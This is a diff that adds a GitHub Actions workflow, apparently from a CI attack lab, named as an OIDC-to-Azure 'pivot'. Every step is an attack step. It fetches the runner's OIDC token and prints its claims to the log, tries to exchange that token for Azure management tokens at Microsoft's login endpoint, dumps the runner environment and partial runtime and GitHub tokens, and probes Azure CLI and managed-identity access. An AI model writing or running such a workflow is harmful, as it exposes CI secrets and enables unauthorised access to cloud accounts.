@@ -1,0 +1,70 @@
+name: OIDC Entra Federation Pivot
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  oidc-pivot:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get GitHub OIDC Token
+        id: oidc
+        run: |
+          echo "::group::Raw OIDC Token"
+          TOK=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          echo "OIDC_TOKEN=$TOK" >> $GITHUB_OUTPUT
+          # Decode header
+          echo "--- JWT Header ---"
+          echo "$TOK" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
+          # Decode claims
+          echo "--- JWT Claims ---"
+          echo "$TOK" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
+          echo "::endgroup::"
+
+      - name: Exchange OIDC → Azure ARM Token
+        id: arm_exchange
+        run: |
+          OIDC_TOK="${{ steps.oidc.outputs.OIDC_TOKEN }}"
+          # Try to exchange OIDC for ARM token via workload identity federation
+          # This works when Azure app registration has federated credential configured
+          # for github.com/0xl3v1n/ci-lab-test
+          for TENANT in $(curl -sf \
+            "https://login.microsoftonline.com/common/v2.0/.well-known/openid-configuration" | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('issuer','').split('/')[3])" 2>/dev/null); do
+            echo "Trying tenant: $TENANT"
+          done
+          # Generic attempt with common tenant patterns
+          for AUDIENCE in "api://AzureADTokenExchange" "https://management.azure.com/"; do
+            RESULT=$(curl -sf -X POST \
+              "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$OIDC_TOK&scope=https://management.azure.com/.default&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+              2>/dev/null)
+            echo "OIDC exchange attempt ($AUDIENCE): $RESULT"
+          done
+
+      - name: Full Runner Environment Dump
+        run: |
+          printenv | sort
+          echo "---ACTIONS_ID_TOKEN_REQUEST_URL---"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "---ACTIONS_RUNTIME_TOKEN (first 40)---"
+          echo "${ACTIONS_RUNTIME_TOKEN:0:40}..."
+          echo "---GITHUB_TOKEN (first 40)---"
+          echo "${GITHUB_TOKEN:0:40}..."
+
+      - name: Azure CLI Auth Probe
+        run: |
+          which az && az --version || echo "az not in PATH"
+          az account show 2>/dev/null || echo "not logged in"
+          az account list 2>/dev/null || echo "no accounts"
+          # Try device-code flow metadata
+          az login --identity 2>/dev/null || echo "no managed identity"
